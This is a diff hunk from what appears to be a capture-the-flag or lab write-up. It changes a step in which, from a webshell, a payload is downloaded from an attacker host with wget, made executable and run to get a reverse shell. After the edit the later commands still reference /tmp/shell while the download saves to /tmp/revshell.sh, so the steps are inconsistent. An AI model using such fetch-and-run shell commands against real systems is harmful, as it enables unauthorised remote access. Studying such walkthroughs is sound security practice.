@@ -15,7 +15,7 @@ php -S 0.0.0.0:8000`.
 
 * Then from the webshell I enter the following   
   ```
-  wget http://10.10.14.3:8000/shell-x64.elf -O /tmp/shell
+  wget http://10.10.14.8:8000/revshell.sh -O /tmp/revshell.sh
   chmod +x /tmp/shell
   bash /tmp/shell
   ```
